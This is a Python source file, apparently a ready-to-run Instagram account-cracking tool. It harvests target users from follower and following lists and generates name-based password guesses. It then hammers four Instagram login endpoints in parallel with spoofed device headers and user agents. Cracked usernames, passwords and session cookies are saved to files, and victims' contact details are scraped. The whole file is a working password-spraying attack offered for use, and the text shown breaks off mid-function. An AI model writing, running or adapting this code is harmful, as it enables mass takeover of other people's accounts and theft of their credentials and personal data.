import urllib.parse
from urllib.parse import quote
import re
import os
import sys
import json
import random
import urllib
import urllib.request
import hashlib
import time
import uuid
import requests
import base64
import datetime
from concurrent.futures import ThreadPoolExecutor
from rich.panel import Panel as panel
from rich import print as prints

xx = 0
rr = random.randint
rc = random.choice

Uid, Uuid = [], []
Ok, Cp, Loop = 0, 0, 0
SistemLog = "api.instagram.com"  # Default method

WHITE = '\x1b[1;97m'
RED = '\x1b[1;91m'
GREEN = '\x1b[1;92m'
YELLOW = '\x1b[1;93m'
BLUE = '\x1b[1;94m'
PURPLE = '\x1b[1;95m'
CYAN = '\x1b[1;96m'
ORANGE = '\033[38;2;255;127;0;1m'
RESET = '\x1b[0m'
campur = random.choice([WHITE, GREEN, YELLOW, BLUE, PURPLE, CYAN, ORANGE, RESET])

getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
HEADERS = {
    'Host': 'www.instagram.com',
    'x-ig-app-id': '1217981644879628',
    'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT',
    'sec-ch-ua-mobile': '?1',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'x-asbd-id': '129477',
    'x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E',
    'sec-fetch-site': 'same-origin',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'
}
ua = {
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)'
}
userinfo = 'https://i.instagram.com/api/v1/users/{id!s}/info/'

def Clear():
    try:
        os.system('clear')
    except:
        pass

def find_res():
    cookie = None
    try:
        if os.path.isfile('data/OK.txt'):
            with open('data/OK.txt', 'r') as f:
                lines = f.read().splitlines()
                for line in lines:
                    if 'sessionid=' in line:
                        cookie = line.strip()
                        break
        if not cookie and os.path.isfile('data/cookie.txt'):
            with open('data/cookie.txt', 'r') as f:
                cookie = f.read().strip()
    except:
        pass
    return cookie

def Aset_Ig():
    os.system('clear')
    coki = {}
    if os.path.isfile('data/cookie.txt'):
        cookie_str = open('data/cookie.txt', 'r').read().strip()
        if cookie_str:
            coki = {'cookie': cookie_str}
    if not coki:
        print(f"{RED}[{WHITE}+{RED}] {CYAN}Please enter your instagram account cookie. Make sure to use a throwaway account!")
        cookie_input = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Cookie :{YELLOW} ").strip()
        if cookie_input.lower() == 'res':
            cookie_str = find_res()
            if not cookie_str:
                print(f"{RED}Failed to load backup cookie, please enter manually.")
                cookie_input = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Cookie :{YELLOW} ").strip()
                coki = {'cookie': cookie_input}
            else:
                coki = {'cookie': cookie_str}
        else:
            coki = {'cookie': cookie_input}
    try:
        uid = re.search(r'ds_user_id=(\d+)', str(coki['cookie'])).group(1)
        resp = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki)
        resp.raise_for_status()
        user_data = resp.json().get('user', {})
        full_name = user_data.get('full_name', 'Name Unknown')
        follower_count = user_data.get('follower_count', 0)
        open('data/cookie.txt', 'w').write(coki['cookie'])
        return coki, full_name, follower_count
    except Exception as e:
        print(f"{RED}Invalid cookies or error: {e}")
        os.system('rm -rf data/cookie.txt')
        time.sleep(2)
        return Aset_Ig()

def Menu():
    global Uuid
    os.system('clear')
    aset, nama, fol = Aset_Ig()
    print(f"{BLUE}=" * 80)
    print(f"""{campur} 
 _______  ______ _______ _______ _     _      _____  ______
 |       |_____/ |_____| |       |____/         |   |  ____
 |_____  |    \\_ |     | |_____  |    \\_      __|__ |_____|
                                          
{CYAN}╭──────────────────────╮{CYAN}╭───────────────╮{CYAN}╭─────────────────────────╮
{CYAN}│ {CYAN}Author : {GREEN}RAYANXWEB {CYAN}│{CYAN}  │ {WHITE}Version : {GREEN}2.0 {CYAN}│{CYAN}│ {WHITE}Status : {GREEN}Premium{CYAN}    │
{CYAN}╰──────────────────────╯{CYAN}╰───────────────╯{CYAN}╰─────────────────────────╯""")
    print(f"{GREEN}{WHITE}Username :{GREEN} {nama[:8]}\n{WHITE}Followers : {GREEN}{fol}")
    
    print(f"\n{RED}[ {YELLOW}Crack Menu {RED}]\n\n{RED}[{WHITE}01{RED}] {CYAN} Crack from followers\n{RED}[{WHITE}02{RED}] {CYAN} Crack from following\n{RED}[{WHITE}03{RED}] {CYAN} Crack from file\n{RED}[{WHITE}00{RED}] {RED} Delete/Change Cookies")
    print(f"{BLUE}=" * 80)
    x = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Please select a menu option :{YELLOW} ")

    if x in ['01', '1']:
        dumps(aset, True)
    elif x in ['02', '2']:
        dumps(aset, False)
    elif x in ['03', '3']:
        crackfile()
    elif x in ['00', '0']:
        os.system("rm data/cookie.txt")
        prints(f"{GREEN}Successfully deleted cookies")
        exit()

def crackfile():
    global Uuid
    nu = input(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Enter Your File Name: {PURPLE}")
    try:
        with open(nu, 'r') as file:
            for line in file:
                username = line.strip()
                if username:
                    Uuid.append(username + '|' + username)  # Add username with placeholder name
        print(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Total IDs loaded: {len(Uuid)}")
        if len(Uuid) > 0:
            MetodeType()
        else:
            print(f"{RED}No valid usernames found in file!")
            time.sleep(2)
            Menu()
    except FileNotFoundError:
        print(f"{PURPLE}[{RED}+{PURPLE}] {RED}File Not Found.")
        time.sleep(2)
        Menu()
    except Exception as e:
        print(f"{RED}Error: {e}")
        time.sleep(2)
        Menu()

def dumps(cintil, typess):
    global Uuid
    xyz = []
    if 'csrftoken' not in str(cintil):
        try:
            memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=cintil).json()
            token = memek['config']['csrf_token']
            cintil['cookie'] += ';csrftoken=%s;' % token
        except Exception as e:
            os.system('rm -rf data/cookie.txt')
            exit(f'\n{WHITE}[{YELLOW}!{WHITE}] Csrftoken not available, dump will not run: {e}')
    
    prints(panel(f"\n{CYAN}Enter instagram usernames, use commas for mass cracking", style="Purple"))
    users = input(f"{RED}[{WHITE}+{RED}] {BLUE}Username :{YELLOW} ").split(',')
    
    for y in users:
        y = y.strip()
        if not y:
            continue
        try:
            req = requests.get(f'https://www.instagram.com/{y}/', cookies=cintil).text
            uid = re.search(r'"user_id":"(\d+)"', str(req))
            if uid:
                uid = uid.group(1)
                if uid not in xyz:
                    xyz.append(uid)
        except:
            pass
    
    if not xyz:
        print(f"{RED}No user IDs found!")
        time.sleep(2)
        Menu()
        return
    
    # Collect followers/following for each user
    for userid in xyz:
        try:
            if typess:
                Graphql(True, userid, cintil['cookie'], '')
            else:
                Graphql(False, userid, cintil['cookie'], '')
        except:
            pass
    
    if len(Uuid) == 0:
        print(f"{RED}No usernames collected! Check your cookie or target username.")
        time.sleep(3)
        Menu()
        return
    
    print(f"\n{GREEN}Collected {len(Uuid)} usernames")
    time.sleep(1)
    MetodeType()

def Graphql(typess, userid, cokie, after):
    global xx, Uuid
    api = "https://www.instagram.com/graphql/query/"
    csr = 'variables={"id":"%s","first":24,"after":"%s"}' % (userid, after)
    mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if not typess else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
    try:
        ptk = {
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "cookie": cokie
        }
        req = requests.get(api, params=mek, headers=ptk).json()
        if 'require_login' in req:
            if len(Uuid) == 0:
                exit(f'\n{WHITE}[{YELLOW}!{WHITE}] Invalid Cookie')
        khm = 'edge_followed_by' if typess else 'edge_follow'
        for xyz in req['data']['user'][khm]['edges']:
            username = xyz['node']['username']
            full_name = xyz['node']['full_name'] if xyz['node']['full_name'] else username
            xy = username + '|' + full_name
            if xy not in Uuid:
                xx += 1
                Uuid.append(xy)
                print(f'\rCollecting Uid {RED}{len(Uuid)}{WHITE}                            ', end='')
                time.sleep(0.0009)
        end = req['data']['user'][khm]['page_info']['has_next_page']
        if end:
            after = req['data']['user'][khm]['page_info']['end_cursor']
            Graphql(typess, userid, cokie, after)
    except Exception as e:
        pass

def MetodeType():
    global SistemLog, Uuid
    if len(Uuid) == 0:
        print(f"{RED}No usernames to crack! Please collect targets first.")
        time.sleep(2)
        Menu()
        return
    
    prints(panel(f"""\n{RED}[ {BLUE}Select the method to use{RED} ]\n\n{RED}[{CYAN}01{RED}] {WHITE}api.instagram.com method {GREEN}Recommended{WHITE}
{RED}[{CYAN}02{RED}] {WHITE}i.instagram.com method
{RED}[{CYAN}03{RED}] {WHITE}www.instagram.com method
{RED}[{CYAN}04{RED}] {WHITE}b.i.instagram.com method""", style="Purple"))
    method = input(f"\n{RED}[{WHITE}+{RED}]{BLUE} Select Menu : {YELLOW}")
    if method in ['01', '1']:
        SistemLog = "api.instagram.com"
    elif method in ['02', '2']:
        SistemLog = "i.instagram.com"
    elif method in ['03', '3']:
        SistemLog = "www.instagram.com"
    elif method in ['04', '4']:
        SistemLog = "b.i.instagram.com"
    else:
        SistemLog = "api.instagram.com"
    SetCrack()

def SetCrack():
    global Uuid, Ok, Cp, Loop, SistemLog
    if len(Uuid) == 0:
        print(f"{RED}No targets to crack!")
        time.sleep(2)
        Menu()
        return
    
    print(f"\n{YELLOW}Cracking {len(Uuid)} targets in progress...\n{WHITE}")
    
    with ThreadPoolExecutor(max_workers=10) as ASF:
        futures = []
        for i in Uuid:
            try:
                if '|' in i:
                    username, name = i.split('|', 1)
                else:
                    username = i
                    name = i
                kontol = Password(name)
                
                if SistemLog == "api.instagram.com":
                    futures.append(ASF.submit(Crack_api, username, kontol))
                elif SistemLog == "i.instagram.com":
                    futures.append(ASF.submit(Crack_i, username, kontol))
                elif SistemLog == "www.instagram.com":
                    futures.append(ASF.submit(Crack_w, username, kontol))
                elif SistemLog == "b.i.instagram.com":
                    futures.append(ASF.submit(Crack_N, username, kontol))
            except Exception as e:
                pass
    
    # Wait for all threads to complete
    for future in futures:
        try:
            future.result(timeout=30)
        except:
            pass
    
    print(f"\n\n{GREEN}Cracking completed!")
    print(f"{GREEN}OK: {Ok} | CP: {Cp} | Total: {len(Uuid)}")
    input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Press Enter to continue...")
    Menu()

def Password(name):
    xxzx = []
    if not name:
        name = "user"
    for nama in name.split(' '):
        nama = nama.lower().strip()
        if len(nama) < 3:
            continue
        elif len(nama) in [3, 4, 5]:
            xxzx.extend([
                nama + '123', nama + '26', nama + '1234',
                'wonosobo123', 'skorsa99', nama + '2008',
                'wonosobo12345', 'wonosobo1234', nama + '28',
                nama + '2009', nama + '456',
                nama.capitalize() + '789', 'katasandi',
                nama.capitalize() + 'cantik', nama.capitalize() + '1234',
                nama.capitalize() + '29', nama.capitalize() + '12',
                nama.capitalize() + '123456', nama.capitalize() + '123',
                nama.capitalize() + '12345'
            ])
        else:
            xxzx.extend([
                nama, name, nama + '1234', nama + '12345',
                nama + '123456789', nama + '99', nama + '12',
                nama + '123456', nama.capitalize() + '321',
                nama + '34', nama + '2009', nama + '28',
                nama + '29', 'wonosobo12345', 'wonosobo1234',
                nama + '20', nama + '2008', nama + '2010',
                nama.capitalize() + '123', nama.capitalize() + '12345'
            ])
    return xxzx

def convert_cookie(item):
    try:
        sesid = re.search(r'sessionid=(\d+)', str(item)).group(1)
        ds_id = re.search(r'ds_user_id=(\d+)', str(item)).group(1)
        csrft = re.search(r'csrftoken=(.*?);', str(item)).group(1)
        donez = f'{ds_id};sessionid={sesid};csrftoken={csrft};ig_nrcb=1;dpr=2'
    except:
        donez = 'cookies not found, error during conversion'
    return donez

ses = requests.Session()

def data_target(name):
    post = peng = meng = mail = fullname = fbid = phone = None
    try:
        HEADERS.update({
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
            'x-ig-app-id': '1217981644879628'
        })
        profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={name}', headers=HEADERS).json()['data']['user']
        post = profil_info_target.get("edge_owner_to_timeline_media", {}).get("count", 0)
        peng = profil_info_target.get("edge_followed_by", {}).get("count", 0)
        meng = profil_info_target.get("edge_follow", {}).get("count", 0)
        mail = profil_info_target.get("business_email", None)
        phone = profil_info_target.get("business_phone_number", None)
        fullname = profil_info_target.get("full_name", None)
        fbid = profil_info_target.get("fbid", None)
    except:
        pass
    return post, peng, meng, mail, fullname, fbid, phone

def UserAgentBarcelona():
    android_version = random.choice(["27/9","28/10","29/11","30/12","31/13","32/9","33/10"])
    dpi = random.choice(['240dpi','320dpi','400dpi','480dpi'])
    pxl = random.choice(['720x1280','1080x1920','1440x2560'])
    kode = random.choice(['145652090','206670917','185203686'])
    brand = random.choice(['samsung','realme','OnePlus','Xiaomi'])
    ig_version = random.choice(["70.0.0.15.98", "80.0.0.20.101", "60.0.0.10.76"])
    model = random.choice(['SM-A015F','SM-A025F','SM-G991B','RMX2020'])
    iphone = random.choice(['iPhone13,2', 'iPhone14,1', 'iPhone15,2'])
    build = random.choice(['a32','a52','beyond1','RE54ABL1'])
    chipset = random.choice(['mt6739','mt6761','qcom','exynos7420'])
    locale = random.choice(['id_ID','en_US','en_GB'])
    ua1 = f'instagram {ig_version} Android ({android_version}; {dpi}; {pxl}; {brand}; {model}; {build}; {chipset}; {locale}; {kode})'
    ua2 = f'instagram {ig_version} ({iphone}; iOS 17_5_1; {locale}; ru; scale=3.00; {pxl}; {kode}; IABMV/1)'
    return random.choice([ua1, ua2])

def Crack_api(username, memek):
    global Ok, Cp, Loop
    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} web {YELLOW}{Loop}{WHITE}/{GREEN}{len(Uuid)}{WHITE}/{GREEN}{username[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    for password in memek:
        try:
            ses = requests.Session()
            cok = ses.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                          headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104'}).cookies.get_dict()
            cooki = "; ".join([f"{key}={value}" for key, value in cok.items()])
            csrf = list(ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/').cookies.items())[0][1]
            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/23F81 instagram 317.0.4.27.109 (iPhone18,1; iOS 26_5_1; en_US; en; scale=3.00; 960x2079; 562830928) NW/3',
                'Content-Type': 'application/x-www-form-urlencoded',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'x-ig-www-claim': 'hmac.AR0y3gXr0HnsEAH0EGqFP7FOuPYc7F3xsPm3GzTw2fqbjS4e',
                'sec-ch-ua-platform-version': '"11.0.0"',
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                'sec-ch-prefers-color-scheme': 'dark',
                'x-csrftoken': f'{csrf}',
                'sec-ch-ua-platform': '"Android"',
                'x-ig-app-id': '1217981644879628',
                'sec-ch-ua-model': '"Redmi Note 8"',
                'sec-ch-ua-mobile': '?1',
                'x-instagram-ajax': '1014410995',
                'x-asbd-id': '129477',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'Cookie': cooki
            }
            data = f'enc_password=%23PWD_instagram_BROWSER%3A0%3A{int(datetime.datetime.now().timestamp())}%3A{urllib.parse.quote(str(password))}&optIntoOneTap=false&queryParams=%7B%22next%22%3A%22%2F%22%2C%22source%22%3A%22mobile_nav%22%7D&trustedDeviceRecords=%7B%7D&username={urllib.parse.quote(str(username))}'
            response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
            
            if 'userId' in str(response.text):
                kuki = ";".join([str(x) + "=" + str(y) for x, y in ses.cookies.get_dict().items()])
                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
                print(f"\n{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}")
                print(f"Username: {GREEN}{username}{BLUE}")
                print(f"Password: {GREEN}{password}{BLUE}")
                print(f"Followers: {GREEN}{peng}{BLUE}")
                print(f"Following: {GREEN}{meng}{BLUE}")
                print(f"Posts: {GREEN}{post}{BLUE}")
                print(f"fb_id: {GREEN}{fbid}{BLUE}")
                print(f"{BLUE}Authorization: {WHITE}{kuki}{WHITE}\n")
                Ok += 1
                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{kuki}\n")
                break
            elif 'checkpoint' in str(response.text):
                Cp += 1
                print(f"\n{WHITE}Username: {BLUE}{username}{WHITE}")
                print(f"Password: {BLUE}{password}{WHITE}")
                open('data/CP.txt', 'a').write(f'{username}|{password}\n')
                break
            elif 'ip_block' in response.text or 'spam' in response.text:
                sys.stdout.write(f"\rStatus IP: {RED}Spam{WHITE} {YELLOW}{Loop}{WHITE}/{GREEN}{len(Uuid)}{WHITE}/{GREEN}{username[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
                sys.stdout.flush()
                time.sleep(5)
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
    Loop += 1

def Crack_i(username, memek):
    global Ok, Cp, Loop
    sys.stdout.write(f"\rStatus IP: {GREEN}Safe{WHITE} api {YELLOW}{Loop}{WHITE}/{GREEN}{len(Uuid)}{WHITE}/{GREEN}{username[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    for password in memek:
        try:
            ses = requests.Session()
            useragent = UserAgentBarcelona()
            device_id = str(uuid.uuid4())
            _hash = hashlib.md5()
            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
            data = {
                'signed_body': 'aa792afa7c0f5b1680531edb1681750fcc45a3718142c399d2420291431be7f1.{"id":"' + str(device_id) + '","server_config_retrieval":"1","experiments":"ig_android_fci_onboarding_friend_search"}',
                'ig_sig_key_version': '4'
            }
            ses.headers.update({
                'X-Pigeon-Session-Id': str(uuid.uuid4()),
                'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),
                'X-IG-Connection-Speed': '-1kbps',
                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
                'X-IG-Connection-Type': 'MOBILE(LTE)',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': useragent,
                'Accept-Language': 'id-ID, en-US',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive'
            })
            response = ses.post('https://i.instagram.com/api/v1/qe/sync/', data=data)
            try:
                _csrftoken = ses.cookies.get_dict()['csrftoken']
            except:
                _csrftoken = ''
            
            data2 = f'signed_body=c47e37e1131fb044652977e468f13e6139bbd66e437069921457f7afb70bcdba.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.parse.quote(str(uuid.uuid4()))}%22%2C%22_csrftoken%22%3A%22{urllib.parse.quote(str(_csrftoken))}%22%2C%22username%22%3A%22{urllib.parse.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.parse.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.parse.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.parse.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22password%22%3A%22{urllib.parse.quote(str(password))}%22%2C%22login_attempt_count%22%3A%221%22%7D&ig_sig_key_version=4'
            response2 = ses.post('https://i.instagram.com/api/v1/accounts/login/', data=data2, allow_redirects=True)
            if 'logged_in_user' in response2.text or 'sessionid' in ses.cookies.get_dict().keys():
                try:
                    ig_set_authorization = response2.headers['ig-set-authorization']
                except:
                    ig_set_authorization = None
                Ok += 1
                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
                print(f"\n{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}")
                print(f"Username: {GREEN}{username}{BLUE}")
                print(f"Password: {GREEN}{password}{BLUE}")
                print(f"Followers: {GREEN}{peng}{BLUE}")
                print(f"Following: {GREEN}{meng}{BLUE}")
                print(f"Posts: {GREEN}{post}{BLUE}")
                print(f"fb_id: {GREEN}{fbid}{BLUE}")
                print(f"{BLUE}Authorization: {WHITE}{ig_set_authorization}{WHITE}\n")
                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
                break
            elif 'challenge_required' in response2.text:
                Cp += 1
                print(f"\n{WHITE}Username: {BLUE}{username}{WHITE}")
                print(f"Password: {BLUE}{password}{WHITE}")
                open('data/CP.txt', 'a').write(f'{username}|{password}\n')
                break
            elif 'ip_block' in response2.text or 'generic_request_error' in response2.text:
                sys.stdout.write(f"\rStatus IP: {RED}spam{WHITE} api {YELLOW}{Loop}{WHITE}/{GREEN}{len(Uuid)}{WHITE}/{GREEN}{username[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
                sys.stdout.flush()
                time.sleep(5)
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
    Loop += 1

def Crack_w(username, memek):
    global Ok, Cp, Loop
    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} threads {YELLOW}{Loop}{WHITE}/{GREEN}{len(Uuid)}{WHITE}/{GREEN}{username[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    for password in memek:
        try:
            ses = requests.Session()
            uag = UserAgentBarcelona()
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            _hash = hashlib.md5()
            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
            
            data = f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22password%22%3A%22%23PWD_instagram%3A0%3A{int(datetime.datetime.now().timestamp())}%3A{urllib.parse.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22contact_point%22%3A%22{urllib.parse.quote(str(username))}%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
            
            ses.headers.update({
                'x-fb-http-engine': 'Liger',
                'Host': 'i.instagram.com',
                'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-device-id': device_id,
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'user-agent': uag,
                'x-ig-family-device-id': family_device_id,
                'accept-language': 'id-ID, en-US',
                'x-ig-app-id': '3419628305025917',
                'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
                'x-ig-timezone-offset': str(-time.timezone),
            })
            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)
            resp_text = response.text.replace('\\', '')
            
            if 'Bearer IGT:2:' in resp_text and '"pk_id":' in resp_text:
                try:
                    ig_set_authorization = re.search(r'"IG-Set-Authorization": "(.*?)"', resp_text).group(1)
                    decode_cookie = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
                    cookies = ";".join([f"{k}={v}" for k, v in decode_cookie.items()])
                except:
                    cookies = '-'
                Ok += 1
                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
                print(f"\n{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}")
                print(f"Username: {GREEN}{username}{BLUE}")
                print(f"Password: {GREEN}{password}{BLUE}")
                print(f"Followers: {GREEN}{peng}{BLUE}")
                print(f"Following: {GREEN}{meng}{BLUE}")
                print(f"Posts: {GREEN}{post}{BLUE}")
                print(f"fb_id: {GREEN}{fbid}{BLUE}")
                print(f"{BLUE}Cookie: {WHITE}{cookies}{WHITE}\n")
                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{cookies}\n")
                break
            elif 'challenge_required' in resp_text or '/challenge/' in resp_text:
                Cp += 1
                print(f"\n{WHITE}Username: {BLUE}{username}{WHITE}")
                print(f"Password: {BLUE}{password}{WHITE}")
                open('data/CP.txt', 'a').write(f'{username}|{password}\n')
                break
            elif 'ip_block' in resp_text or 'Please wait' in resp_text:
                sys.stdout.write(f"\rStatus IP: {RED}spam{WHITE} threads {YELLOW}{Loop}{WHITE}/{GREEN}{len(Uuid)}{WHITE}/{GREEN}{username[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
                sys.stdout.flush()
                time.sleep(5)
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
    Loop += 1

def Crack_N(username, memek):
    global Ok, Cp, Loop
    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} api2 {YELLOW}{Loop}{WHITE}/{GREEN}{len(Uuid)}{WHITE}/{GREEN}{username[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    for password in memek:
        try:
            ua2 = UserAgentBarcelona().replace('Barcelona 289.0.0.77.109', 'instagram 244.0.0.17.110').replace('489720145', '383877253')
            ses = requests.Session()
            device_id = str(uuid.uuid4())
            _hash = hashlib.md5()
            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
            
            ses.headers.update({
                'authority': 'i.instagram.com',
                'x-bloks-version-id': '8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07',
                'x-ig-capabilities': '3brTv10=',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'user-agent': ua2,
                'x-ig-device-id': device_id,
                'x-ig-app-id': '567067343352427',
                'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
                'x-ig-timezone-offset': str(-time.timezone),
            })
            data = f'signed_body=SIGNATURE.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.parse.quote(str(uuid.uuid4()))}%22%2C%22enc_password%22%3A%22%23PWD_instagram%3A0%3A{int(datetime.datetime.now().timestamp())}%3A{urllib.parse.quote(str(password))}%3D%22%2C%22username%22%3A%22{urllib.parse.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.parse.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.parse.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.parse.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%220%22%7D'
            response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/', data=data)
            
            if 'logged_in_user' in response.text and '"pk_id":' in response.text:
                ig_set_authorization = response.headers.get('ig-set-authorization')
                Ok += 1
                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
                print(f"\n{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}")
                print(f"Username: {GREEN}{username}{BLUE}")
                print(f"Password: {GREEN}{password}{BLUE}")
